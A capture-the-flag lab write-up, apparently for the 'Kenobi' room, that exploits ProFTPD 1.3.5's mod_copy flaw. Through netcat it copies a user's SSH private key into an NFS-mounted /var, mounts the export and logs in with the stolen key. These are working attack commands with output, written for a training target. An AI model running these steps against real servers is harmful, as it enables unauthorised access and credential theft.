# Step 1 - Connect to the ftp port via netcat 

```bash
$ nc 10.10.45.110 21                                               
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.45.110]
```

# Step 2 - Use searchsploit to discover any available exploits
```bash
$ searchsploit proftpd 
[...]
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution     | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                               | linux/remote/36742.txt
[...]
```

The exploit 36742 allows for any file to be copied and downloaded as long as you know about it and where it exists. Using the information from the log.txt file we know that kenobi's ssh key is in the path /home/kenobi/.ssh/id_rsa. 
Combining this information information from the rpc enumeration, where we found that the var directoryis a mount and therefore we can copy kenobi's ssh key to the var directory.

```bash
$ nc 10.10.45.110 21                                               
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.45.110]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

### Note:
* SITE CPFR - Copy From 
* SITE CPTO - Copy To

# Step 3 - Mount the var directory
```bash
(boolean㉿kalibox)[~/thm/kenobi]$ sudo mount 10.10.45.110:/var /mnt/kenobi                                                                                                                        
(boolean㉿kalibox)[~/thm/kenobi]$ ll /mnt/kenobi/tmp
total 20
-rw-r--r-- 1 boolean boolean 1675 Apr 28 20:55 id_rsa
drwx------ 3 root    root    4096 Apr 28 20:17 systemd-private-0f4c15abb56140b88d8ebaa70883b26c-systemd-timesyncd.service-oA2y7u
drwx------ 3 root    root    4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
drwx------ 3 root    root    4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
drwx------ 3 root    root    4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
```

# Step 4 - Copy id_rsa file
With the id_rsa we are able to ssh to the server as user kenobi

```bash
$ ssh -i id_rsa kenobi@10.10.45.110 
```
